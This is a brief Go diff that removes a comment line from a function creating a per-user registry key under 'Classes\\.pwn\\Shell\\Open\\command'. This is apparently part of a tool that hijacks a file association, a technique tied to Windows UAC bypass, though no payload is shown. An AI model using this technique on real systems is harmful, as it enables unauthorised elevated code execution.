@@ -79,7 +79,6 @@ func cleanReg() {
 }
 
 func createRegParams(tarPath string) bool {
-	////////////////////////////////////////////////
 	key, _, err := registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Classes\\.pwn\\Shell\\Open\\command", registry.ALL_ACCESS)
 	if err != nil {
 		log.Fatal(err)
